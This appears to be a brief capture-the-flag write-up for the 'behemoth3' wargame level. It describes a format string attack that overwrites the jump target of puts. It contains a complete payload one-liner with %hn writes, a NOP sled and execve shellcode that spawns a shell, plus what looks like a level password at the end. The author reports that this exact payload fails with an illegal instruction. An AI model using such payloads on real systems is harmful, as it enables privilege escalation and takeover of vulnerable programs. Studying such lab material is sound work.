this time we'll use format string attack
this time we cant know where the return address is,
so well try to hijack the next function that is called - in this case its puts:
after some tampering, we discover that puts@plt cant be changed 
(we get an error) so we look deeper and see that all it does is call another 
function at 0x080497ac so we head there, only to see that it jump to yet 
another peice of code, so our target is 0x080497ac

we use: 
```sh
echo $(python -c 'print "AAAA\xac\x97\x04\x08AAAA\xae\x97\x04\x08"+"%54740x!%hn%76313x!%hn!"+"\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"') > p

and once we do: ./behemoth3 < p
```

we get:Illegal instruction, which as I explained before, is a problem with 
the os. we'll change the shellcode...

ietheishei

